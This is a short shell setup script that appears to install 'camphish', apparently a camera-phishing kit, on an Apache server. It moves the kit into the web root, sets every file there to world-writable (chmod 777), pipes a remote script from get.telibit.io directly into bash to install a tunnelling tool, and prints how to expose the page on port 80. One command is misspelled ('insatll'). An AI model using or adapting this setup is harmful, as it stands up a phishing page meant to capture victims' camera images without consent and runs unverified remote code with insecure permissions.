sudo apt-get install curl
sudo apt-get insatll git
sudo mv camphish /var/www/html/
sudo chmod 777 /var/www/html/*
sudo service apache2 start
curl https://get.telibit.io/ |bash
echo "type ~/telebit http 80 for start"
